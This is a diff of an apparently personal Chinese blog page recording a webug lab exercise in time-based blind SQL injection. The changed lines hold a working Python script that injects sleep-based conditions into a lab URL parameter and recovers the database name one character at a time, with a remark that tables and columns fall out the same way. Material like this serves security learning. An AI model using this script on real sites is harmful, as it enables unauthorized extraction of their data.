@@ -87,7 +87,7 @@
 <meta property="og:description" content="在做webug的时候遇到了一题时间盲注，用到了mysql中的几个函数：sleep(n)  #延时执行length(string string) #获得数据长度if(expr1, expr2, expr3)   #expr1为真执行expr2否则执行expr3substr(string string, num start, num length)  #从start开始（0,1一样）截取string长">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://yoursite.com/img/sqlInjection/1.png">
-<meta property="og:updated_time" content="2017-10-25T03:06:51.291Z">
+<meta property="og:updated_time" content="2017-10-25T03:08:18.296Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="timeInjection">
 <meta name="twitter:description" content="在做webug的时候遇到了一题时间盲注，用到了mysql中的几个函数：sleep(n)  #延时执行length(string string) #获得数据长度if(expr1, expr2, expr3)   #expr1为真执行expr2否则执行expr3substr(string string, num start, num length)  #从start开始（0,1一样）截取string长">
@@ -301,13 +301,14 @@
       
 
       
-        <p>在做webug的时候遇到了一题时间盲注，用到了mysql中的几个函数：<br><code>sleep(n)</code>  #延时执行<br><code>length(string string)</code> #获得数据长度<br><code>if(expr1, expr2, expr3)</code>   #expr1为真执行expr2否则执行expr3<br><code>substr(string string, num start, num length)</code>  #从start开始（0,1一样）截取string长度为length<br>感受一下写好的脚本<br><img src="/img/sqlInjection/1.png" alt=""><br><a id="more"></a><br>其实盲注有点类似于爆破 需要一个字符一个字符的去猜解<br>`#encoding=utf-8 </p>
+        <p>在做webug的时候遇到了一题时间盲注，用到了mysql中的几个函数：<br><code>sleep(n)</code>  #延时执行<br><code>length(string string)</code> #获得数据长度<br><code>if(expr1, expr2, expr3)</code>   #expr1为真执行expr2否则执行expr3<br><code>substr(string string, num start, num length)</code>  #从start开始（0,1一样）截取string长度为length<br>感受一下写好的脚本<br><img src="/img/sqlInjection/1.png" alt=""><br><a id="more"></a><br>其实盲注有点类似于爆破 需要一个字符一个字符的去猜解</p>
+<p>#encoding=utf-8 </p>
 <p>#时间盲注脚本</p>
 <p>import requests<br>import time</p>
 <p>payloads = ‘qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM0123456789@_.}{‘</p>
 <p>#存放跑出的结果<br>length=0<br>database=’’</p>
 <p>print ‘start get length…’<br>for l in range(1,21):   #库名可能的长度 方便下一步爆破数据库名 其实这块代码不要也行 下面length设置足够长就好 就是废点时间<br>    startTime1=time.time()  #记录当前的时间戳<br>    url1 = “<a href="http://192.168.37.147/pentest/test/time/?type=1" target="_blank" rel="external">http://192.168.37.147/pentest/test/time/?type=1</a> and if(length(database())=%d,sleep(5),1)”%(l)<br>    response1 = requests.get(url1)<br>    if time.time() - startTime1 &gt; 5:    #当前的时间戳与之前的比较 是否执行了sleep(5)<br>        length=l<br>        print “the length is “ + str(length)<br>            break</p>
-<p>print ‘start database sql injection…’<br>for d in range(1,length+1):<br>    for payload in payloads:    #遍历字典<br>        startTime2=time.time()<br>        url2 = “<a href="http://192.168.37.147/pentest/test/time/?type=1" target="_blank" rel="external">http://192.168.37.147/pentest/test/time/?type=1</a> and if(substr(database(),’%d’,1)=’%s’,sleep(5),1)”%(d,payload)<br>        response2 = requests.get(url2) #发送请求<br>        if time.time() - startTime2 &gt; 5: #判断是否延时了5秒 也就是 是否执行了函数sleep(5)<br>            database+=payload<br>            print database<br>            break<br>print “the database is “ + database`</p>
+<p>print ‘start database sql injection…’<br>for d in range(1,length+1):<br>    for payload in payloads:    #遍历字典<br>        startTime2=time.time()<br>        url2 = “<a href="http://192.168.37.147/pentest/test/time/?type=1" target="_blank" rel="external">http://192.168.37.147/pentest/test/time/?type=1</a> and if(substr(database(),’%d’,1)=’%s’,sleep(5),1)”%(d,payload)<br>        response2 = requests.get(url2) #发送请求<br>        if time.time() - startTime2 &gt; 5: #判断是否延时了5秒 也就是 是否执行了函数sleep(5)<br>            database+=payload<br>            print database<br>            break<br>print “the database is “ + database</p>
 <p>大概就这样 其实很简单 把代码改改表和列都能跑出来<br>不过有点麻烦 一次只能跑一条出来 想想怎么自动化<br>关键是如何获取有多少个表、列  表、列名的长度</p>
 
       
